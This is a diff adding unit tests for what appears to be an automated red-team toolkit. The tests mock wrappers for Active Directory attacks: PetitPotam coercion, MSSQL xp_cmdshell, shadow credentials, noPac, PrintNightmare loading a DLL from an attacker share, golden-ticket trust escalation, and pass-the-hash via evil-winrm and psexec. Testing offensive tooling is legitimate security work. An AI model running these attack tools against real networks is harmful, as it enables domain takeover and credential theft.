@@ -415,3 +415,654 @@ class TestRedTeamReportingTools:
         tools = RedTeamReportingTools()
         tools.set_state(red_team_state)
         assert tools.state == red_team_state
+
+
+class TestCoercionTools:
+    """Tests for CoercionTools class."""
+
+    def test_init(self):
+        """Test initialization."""
+        from ares.tools.red.network import CoercionTools
+
+        tools = CoercionTools()
+        assert tools.state is None
+
+    def test_set_state(self, red_team_state: RedTeamState):
+        """Test setting state."""
+        from ares.tools.red.network import CoercionTools
+
+        tools = CoercionTools()
+        tools.set_state(red_team_state)
+        assert tools.state == red_team_state
+
+    def test_petitpotam_unauthenticated(self, red_team_state: RedTeamState):
+        """Test PetitPotam unauthenticated coercion."""
+        from ares.tools.red.network import CoercionTools
+
+        tools = CoercionTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(
+                stdout="Successfully coerced authentication", return_code=0
+            )
+            result = tools.petitpotam("192.168.56.10", "192.168.56.100")
+
+        assert "success" in result.lower()
+        mock_run.assert_called_once()
+
+    def test_petitpotam_authenticated(self, red_team_state: RedTeamState):
+        """Test PetitPotam authenticated coercion."""
+        from ares.tools.red.network import CoercionTools
+
+        tools = CoercionTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(stdout="Successfully coerced", return_code=0)
+            result = tools.petitpotam(
+                "192.168.56.10",
+                "192.168.56.100",
+                username="user",
+                password="pass",  # pragma: allowlist secret
+                domain="test.local",
+            )
+
+        assert "success" in result.lower()
+
+    def test_petitpotam_failure(self, red_team_state: RedTeamState):
+        """Test PetitPotam failure handling."""
+        from ares.tools.red.network import CoercionTools
+
+        tools = CoercionTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.side_effect = Exception("Connection refused")
+            result = tools.petitpotam("192.168.56.10", "192.168.56.100")
+
+        assert "failed" in result.lower()
+
+    def test_coercer_success(self, red_team_state: RedTeamState):
+        """Test Coercer tool success."""
+        from ares.tools.red.network import CoercionTools
+
+        tools = CoercionTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(
+                stdout="Triggered authentication via MS-EFSRPC", return_code=0
+            )
+            result = tools.coercer(
+                "192.168.56.10",
+                "192.168.56.100",
+                "user",
+                "pass",  # pragma: allowlist secret
+                "test.local",
+            )
+
+        assert "triggered" in result.lower()
+
+    def test_coercer_exception(self, red_team_state: RedTeamState):
+        """Test Coercer exception handling."""
+        from ares.tools.red.network import CoercionTools
+
+        tools = CoercionTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.side_effect = Exception("Timeout")
+            result = tools.coercer(
+                "192.168.56.10",
+                "192.168.56.100",
+                "user",
+                "pass",  # pragma: allowlist secret
+                "test.local",
+            )
+
+        assert "failed" in result.lower()
+
+
+class TestMSSQLTools:
+    """Tests for MSSQLTools class."""
+
+    def test_init(self):
+        """Test initialization."""
+        from ares.tools.red.network import MSSQLTools
+
+        tools = MSSQLTools()
+        assert tools.state is None
+
+    def test_set_state(self, red_team_state: RedTeamState):
+        """Test setting state."""
+        from ares.tools.red.network import MSSQLTools
+
+        tools = MSSQLTools()
+        tools.set_state(red_team_state)
+        assert tools.state == red_team_state
+
+    def test_mssql_login_success(self, red_team_state: RedTeamState):
+        """Test MSSQL login success."""
+        from ares.tools.red.network import MSSQLTools
+
+        tools = MSSQLTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(
+                stdout="master\ntempdb\nIMPERSONATE permission found", return_code=0
+            )
+            result = tools.mssql_login(
+                "192.168.56.22",
+                "user",
+                "pass",  # pragma: allowlist secret
+                domain="test.local",
+            )
+
+        assert "impersonate" in result.lower()
+
+    def test_mssql_login_exception(self, red_team_state: RedTeamState):
+        """Test MSSQL login exception handling."""
+        from ares.tools.red.network import MSSQLTools
+
+        tools = MSSQLTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.side_effect = Exception("Connection refused")
+            result = tools.mssql_login(
+                "192.168.56.22",
+                "user",
+                "pass",  # pragma: allowlist secret
+            )
+
+        assert "failed" in result.lower()
+
+    def test_mssql_xp_cmdshell_success(self, red_team_state: RedTeamState):
+        """Test xp_cmdshell command execution."""
+        from ares.tools.red.network import MSSQLTools
+
+        tools = MSSQLTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(stdout="nt authority\\system", return_code=0)
+            result = tools.mssql_xp_cmdshell(
+                "192.168.56.22",
+                "user",
+                "pass",  # pragma: allowlist secret
+                "whoami",
+                domain="test.local",
+                impersonate="sa",
+            )
+
+        assert "system" in result.lower()
+
+    def test_mssql_xp_cmdshell_exception(self, red_team_state: RedTeamState):
+        """Test xp_cmdshell exception handling."""
+        from ares.tools.red.network import MSSQLTools
+
+        tools = MSSQLTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.side_effect = Exception("Access denied")
+            result = tools.mssql_xp_cmdshell(
+                "192.168.56.22",
+                "user",
+                "pass",  # pragma: allowlist secret
+                "whoami",
+            )
+
+        assert "failed" in result.lower()
+
+
+class TestACLExploitTools:
+    """Tests for ACLExploitTools class."""
+
+    def test_init(self):
+        """Test initialization."""
+        from ares.tools.red.network import ACLExploitTools
+
+        tools = ACLExploitTools()
+        assert tools.state is None
+
+    def test_set_state(self, red_team_state: RedTeamState):
+        """Test setting state."""
+        from ares.tools.red.network import ACLExploitTools
+
+        tools = ACLExploitTools()
+        tools.set_state(red_team_state)
+        assert tools.state == red_team_state
+
+    def test_pywhisker_add_success(self, red_team_state: RedTeamState):
+        """Test pywhisker shadow credentials success."""
+        from ares.tools.red.network import ACLExploitTools
+
+        tools = ACLExploitTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(
+                stdout="Shadow credentials saved to admin.pfx", return_code=0
+            )
+            result = tools.pywhisker(
+                "Administrator",
+                "test.local",
+                "user",
+                "pass",  # pragma: allowlist secret
+                "192.168.56.10",
+            )
+
+        assert ".pfx" in result.lower() or "shadow" in result.lower()
+
+    def test_pywhisker_exception(self, red_team_state: RedTeamState):
+        """Test pywhisker exception handling."""
+        from ares.tools.red.network import ACLExploitTools
+
+        tools = ACLExploitTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.side_effect = Exception("Access denied")
+            result = tools.pywhisker(
+                "Administrator",
+                "test.local",
+                "user",
+                "pass",  # pragma: allowlist secret
+                "192.168.56.10",
+            )
+
+        assert "failed" in result.lower()
+
+    def test_bloodyad_add_group_member_success(self, red_team_state: RedTeamState):
+        """Test bloodyAD group member addition."""
+        from ares.tools.red.network import ACLExploitTools
+
+        tools = ACLExploitTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(
+                stdout="Successfully added user to Domain Admins", return_code=0
+            )
+            result = tools.bloodyad_add_group_member(
+                "controlled_user",
+                "Domain Admins",
+                "test.local",
+                "user",
+                "pass",  # pragma: allowlist secret
+                "192.168.56.10",
+            )
+
+        assert "added" in result.lower() or "success" in result.lower()
+
+    def test_bloodyad_add_group_member_exception(self, red_team_state: RedTeamState):
+        """Test bloodyAD group member exception handling."""
+        from ares.tools.red.network import ACLExploitTools
+
+        tools = ACLExploitTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.side_effect = Exception("Insufficient rights")
+            result = tools.bloodyad_add_group_member(
+                "user",
+                "Domain Admins",
+                "test.local",
+                "user",
+                "pass",  # pragma: allowlist secret
+                "192.168.56.10",
+            )
+
+        assert "failed" in result.lower()
+
+    def test_bloodyad_set_password_success(self, red_team_state: RedTeamState):
+        """Test bloodyAD password reset."""
+        from ares.tools.red.network import ACLExploitTools
+
+        tools = ACLExploitTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(
+                stdout="Password changed successfully", return_code=0
+            )
+            result = tools.bloodyad_set_password(
+                "target_user",
+                "NewP@ss123!",  # pragma: allowlist secret
+                "test.local",
+                "user",
+                "pass",  # pragma: allowlist secret
+                "192.168.56.10",
+            )
+
+        assert "reset" in result.lower() or "changed" in result.lower()
+
+    def test_bloodyad_set_password_exception(self, red_team_state: RedTeamState):
+        """Test bloodyAD password reset exception handling."""
+        from ares.tools.red.network import ACLExploitTools
+
+        tools = ACLExploitTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.side_effect = Exception("Access denied")
+            result = tools.bloodyad_set_password(
+                "target_user",
+                "NewP@ss123!",  # pragma: allowlist secret
+                "test.local",
+                "user",
+                "pass",  # pragma: allowlist secret
+                "192.168.56.10",
+            )
+
+        assert "failed" in result.lower()
+
+
+class TestCVEExploitTools:
+    """Tests for CVEExploitTools class."""
+
+    def test_init(self):
+        """Test initialization."""
+        from ares.tools.red.network import CVEExploitTools
+
+        tools = CVEExploitTools()
+        assert tools.state is None
+
+    def test_set_state(self, red_team_state: RedTeamState):
+        """Test setting state."""
+        from ares.tools.red.network import CVEExploitTools
+
+        tools = CVEExploitTools()
+        tools.set_state(red_team_state)
+        assert tools.state == red_team_state
+
+    def test_nopac_success(self, red_team_state: RedTeamState):
+        """Test noPac exploitation success."""
+        from ares.tools.red.network import CVEExploitTools
+
+        tools = CVEExploitTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(
+                stdout="Administrator hash: aad3b435b51404eeaad3b435b51404ee",
+                return_code=0,
+            )
+            result = tools.nopac(
+                "test.local",
+                "user",
+                "pass",  # pragma: allowlist secret
+                "192.168.56.10",
+                "DC01",
+            )
+
+        assert "hash" in result.lower() or "admin" in result.lower()
+
+    def test_nopac_exception(self, red_team_state: RedTeamState):
+        """Test noPac exception handling."""
+        from ares.tools.red.network import CVEExploitTools
+
+        tools = CVEExploitTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.side_effect = Exception("Target patched")
+            result = tools.nopac(
+                "test.local",
+                "user",
+                "pass",  # pragma: allowlist secret
+                "192.168.56.10",
+                "DC01",
+            )
+
+        assert "failed" in result.lower()
+
+    def test_printnightmare_success(self, red_team_state: RedTeamState):
+        """Test PrintNightmare exploitation."""
+        from ares.tools.red.network import CVEExploitTools
+
+        tools = CVEExploitTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(stdout="DLL executed successfully", return_code=0)
+            result = tools.printnightmare(
+                "192.168.56.22",
+                "user",
+                "pass",  # pragma: allowlist secret
+                "test.local",
+                "\\\\attacker\\share\\rev.dll",
+            )
+
+        assert "success" in result.lower() or "executed" in result.lower()
+
+    def test_printnightmare_exception(self, red_team_state: RedTeamState):
+        """Test PrintNightmare exception handling."""
+        from ares.tools.red.network import CVEExploitTools
+
+        tools = CVEExploitTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.side_effect = Exception("Spooler disabled")
+            result = tools.printnightmare(
+                "192.168.56.22",
+                "user",
+                "pass",  # pragma: allowlist secret
+                "test.local",
+                "\\\\attacker\\share\\rev.dll",
+            )
+
+        assert "failed" in result.lower()
+
+
+class TestTrustAttackTools:
+    """Tests for TrustAttackTools class."""
+
+    def test_init(self):
+        """Test initialization."""
+        from ares.tools.red.network import TrustAttackTools
+
+        tools = TrustAttackTools()
+        assert tools.state is None
+
+    def test_set_state(self, red_team_state: RedTeamState):
+        """Test setting state."""
+        from ares.tools.red.network import TrustAttackTools
+
+        tools = TrustAttackTools()
+        tools.set_state(red_team_state)
+        assert tools.state == red_team_state
+
+    def test_raise_child_success(self, red_team_state: RedTeamState):
+        """Test raise_child domain escalation."""
+        from ares.tools.red.network import TrustAttackTools
+
+        tools = TrustAttackTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(
+                stdout="Enterprise Admin golden ticket created", return_code=0
+            )
+            result = tools.raise_child(
+                "child.test.local",
+                "administrator",
+                "pass",  # pragma: allowlist secret
+            )
+
+        assert "enterprise admin" in result.lower() or "golden ticket" in result.lower()
+
+    def test_raise_child_with_target_domain(self, red_team_state: RedTeamState):
+        """Test raise_child with explicit target domain."""
+        from ares.tools.red.network import TrustAttackTools
+
+        tools = TrustAttackTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(stdout="Escalation successful", return_code=0)
+            result = tools.raise_child(
+                "child.test.local",
+                "administrator",
+                "pass",  # pragma: allowlist secret
+                target_domain="test.local",
+            )
+
+        assert "success" in result.lower() or "escalation" in result.lower()
+
+    def test_raise_child_exception(self, red_team_state: RedTeamState):
+        """Test raise_child exception handling."""
+        from ares.tools.red.network import TrustAttackTools
+
+        tools = TrustAttackTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.side_effect = Exception("Trust not found")
+            result = tools.raise_child(
+                "child.test.local",
+                "administrator",
+                "pass",  # pragma: allowlist secret
+            )
+
+        assert "failed" in result.lower()
+
+
+class TestLateralMovementTools:
+    """Tests for LateralMovementTools class."""
+
+    def test_init(self):
+        """Test initialization."""
+        from ares.tools.red.network import LateralMovementTools
+
+        tools = LateralMovementTools()
+        assert tools.state is None
+
+    def test_set_state(self, red_team_state: RedTeamState):
+        """Test setting state."""
+        from ares.tools.red.network import LateralMovementTools
+
+        tools = LateralMovementTools()
+        tools.set_state(red_team_state)
+        assert tools.state == red_team_state
+
+    def test_evil_winrm_with_password(self, red_team_state: RedTeamState):
+        """Test evil-winrm with password authentication."""
+        from ares.tools.red.network import LateralMovementTools
+
+        tools = LateralMovementTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(
+                stdout="test\\administrator\nDC01\n", return_code=0
+            )
+            result = tools.evil_winrm(
+                "192.168.56.10",
+                "administrator",
+                password="pass",  # pragma: allowlist secret
+            )
+
+        assert "administrator" in result.lower()
+
+    def test_evil_winrm_with_hash(self, red_team_state: RedTeamState):
+        """Test evil-winrm with pass-the-hash."""
+        from ares.tools.red.network import LateralMovementTools
+
+        tools = LateralMovementTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(stdout="nt authority\\system", return_code=0)
+            result = tools.evil_winrm(
+                "192.168.56.10",
+                "administrator",
+                hash="aad3b435b51404eeaad3b435b51404ee",  # pragma: allowlist secret
+            )
+
+        assert "system" in result.lower()
+
+    def test_evil_winrm_no_creds(self, red_team_state: RedTeamState):
+        """Test evil-winrm without credentials fails gracefully."""
+        from ares.tools.red.network import LateralMovementTools
+
+        tools = LateralMovementTools()
+        tools.set_state(red_team_state)
+
+        result = tools.evil_winrm("192.168.56.10", "administrator")
+
+        assert "error" in result.lower()
+
+    def test_evil_winrm_exception(self, red_team_state: RedTeamState):
+        """Test evil-winrm exception handling."""
+        from ares.tools.red.network import LateralMovementTools
+
+        tools = LateralMovementTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.side_effect = Exception("WinRM disabled")
+            result = tools.evil_winrm(
+                "192.168.56.10",
+                "administrator",
+                password="pass",  # pragma: allowlist secret
+            )
+
+        assert "failed" in result.lower()
+
+    def test_psexec_with_password(self, red_team_state: RedTeamState):
+        """Test psexec with password authentication."""
+        from ares.tools.red.network import LateralMovementTools
+
+        tools = LateralMovementTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(stdout="nt authority\\system", return_code=0)
+            result = tools.psexec(
+                "192.168.56.10",
+                "administrator",
+                password="pass",  # pragma: allowlist secret
+                domain="test.local",
+                command="whoami",
+            )
+
+        assert "system" in result.lower()
+
+    def test_psexec_with_hash(self, red_team_state: RedTeamState):
+        """Test psexec with pass-the-hash."""
+        from ares.tools.red.network import LateralMovementTools
+
+        tools = LateralMovementTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.return_value = MockRunResult(stdout="C:\\Windows>", return_code=0)
+            result = tools.psexec(
+                "192.168.56.10",
+                "administrator",
+                hash="aad3b435b51404eeaad3b435b51404ee",  # pragma: allowlist secret
+            )
+
+        assert "windows" in result.lower()
+
+    def test_psexec_exception(self, red_team_state: RedTeamState):
+        """Test psexec exception handling."""
+        from ares.tools.red.network import LateralMovementTools
+
+        tools = LateralMovementTools()
+        tools.set_state(red_team_state)
+
+        with patch("ares.tools.red.network.run_remote") as mock_run:
+            mock_run.side_effect = Exception("SMB blocked")
+            result = tools.psexec(
+                "192.168.56.10",
+                "administrator",
+                password="pass",  # pragma: allowlist secret
+            )
+
+        assert "failed" in result.lower()
